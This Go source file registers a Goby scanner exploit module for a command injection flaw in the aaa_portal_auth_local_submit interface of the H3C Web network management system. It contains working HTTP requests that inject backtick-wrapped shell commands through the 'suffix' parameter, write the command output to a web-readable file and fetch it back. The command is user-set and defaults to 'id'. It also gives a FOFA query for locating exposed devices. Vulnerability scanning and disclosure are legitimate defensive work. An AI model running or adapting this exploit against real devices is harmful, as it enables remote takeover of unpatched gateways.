package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "H3C web network management system aaa_portal_auth_local_submit command execution",
    "Description": "<p>H3C Web network management system is a gateway management device. Users can manage and maintain the device very intuitively through the Web.</p><p>There is a command injection vulnerability in the aaa_portal_auth_local_submit interface of the H3C web network management system. Attackers can use this to execute system commands to obtain system permissions.</p>",
    "Product": "H3C Web Network Management System",
    "Homepage": "http://www.h3c.com/cn/d_200906/636928_30005_0.htm",
    "DisclosureDate": "2022-08-10",
    "Author": "1105216693@qq.com",
    "FofaQuery": "banner=\"Set-Cookie: USGSESSID=\" || header=\"Set-Cookie: USGSESSID=\"",
    "GobyQuery": "banner=\"Set-Cookie: USGSESSID=\" || header=\"Set-Cookie: USGSESSID=\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this to execute system commands to gain system privileges.</p>",
    "Recommendation": "<p>At present, the manufacturer has not released patch information, please pay attention to the official website homepage in time for subsequent upgrade and repair: <a href=\"http://www.h3c.com/cn/d_200906/636928_30005_0.htm\">http://www.h3c.com/cn/d_200906/636928_30005_0.htm</a></p><p>Temporary advice:</p><p>Filter command injection characters in the suffix value passed in by the front end.</p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&suffix=%60%6c%73%20%3e%2f%75%73%72%2f%6c%6f%63%61%6c%2f%77%65%62%75%69%2f%77%65%62%75%69%2f%69%6d%61%67%65%73%2f%62%61%73%69%63%2f%6c%6f%67%69%6e%2f%74%65%73%74%31%31%2e%74%78%74%60",
                "follow_redirect": true,
                "header": {
                    "Host": "127.0.0.1",
                    "Referer": "127.0.0.1"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "logout.php",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/webui/images/basic/login/test11.txt",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "attachements",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "configDefault.inc",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&suffix=%60{{{cmd}}}%20%3e%2f%75%73%72%2f%6c%6f%63%61%6c%2f%77%65%62%75%69%2f%77%65%62%75%69%2f%69%6d%61%67%65%73%2f%62%61%73%69%63%2f%6c%6f%67%69%6e%2f%74%65%73%74%31%31%2e%74%78%74%60",
                "follow_redirect": true,
                "header": {
                    "Host": "127.0.0.1",
                    "Referer": "127.0.0.1"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "logout.php",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/webui/images/basic/login/test11.txt",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "attachements",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "configDefault.inc",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "H3C Web网管系统 aaa_portal_auth_local_submit 命令执行",
            "Product": "H3C Web网管系统",
            "Description": "<p>H3C Web网管系统是一款网关管理设备，<span style=\"color: rgb(0, 0, 0); font-size: 14px;\">用户可以通过Web非常直观地管理、维护设备。</span><br></p><p><span style=\"color: rgb(0, 0, 0); font-size: 14px;\"><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">H3C Web网管系统的aaa_portal_auth_local_submit接口存在命令注入漏洞，攻击者可利用此执行系统命令获取系统权限。</span></span></p>",
            "Recommendation": "<p>目前厂商暂未发布补丁信息，请及时关注官网主页便于后续升级修复：<a href=\"http://www.h3c.com/cn/d_200906/636928_30005_0.htm\">http://www.h3c.com/cn/d_200906/636928_30005_0.htm</a></p><p>临时建议：</p><p>过滤前端传入的suffix值中命令注入字符。</p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">H3C Web网管系统的aaa_portal_auth_local_submit接口存在命令注入漏洞，攻击者可利用此执行系统命令获取系统权限。</span><br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "H3C web network management system aaa_portal_auth_local_submit command execution",
            "Product": "H3C Web Network Management System",
            "Description": "<p>H3C Web network management system is a gateway management device. Users can manage and maintain the device very intuitively through the Web.</p><p>There is a command injection vulnerability in the aaa_portal_auth_local_submit interface of the H3C web network management system. Attackers can use this to execute system commands to obtain system permissions.</p>",
            "Recommendation": "<p>At present, the manufacturer has not released patch information, please pay attention to the official website homepage in time for subsequent upgrade and repair: <a href=\"http://www.h3c.com/cn/d_200906/636928_30005_0.htm\" rel=\"nofollow\">http://www.h3c.com/cn/d_200906/636928_30005_0.htm</a></p><p>Temporary advice:</p><p>Filter command injection characters in the suffix value passed in by the front end.</p>",
            "Impact": "<p>Attackers can use this to execute system commands to gain system privileges.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10697"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}